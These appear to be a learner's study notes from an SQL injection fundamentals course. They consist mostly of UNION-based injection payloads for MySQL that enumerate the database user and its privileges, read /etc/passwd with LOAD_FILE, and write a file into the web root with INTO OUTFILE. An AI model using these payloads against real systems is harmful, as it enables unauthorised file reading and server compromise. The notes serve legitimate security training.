![[Sql_Injection_Fundamentals_Module_Cheat_Sheet.pdf]]

## Read Files
### Find current user
```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

### Find super priv
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

### Find multiple rights
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

### Read File
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

## Write Files
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

secure_file_priv must be empty

### Write Location
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

Should be fuzzed for whitelisted directory 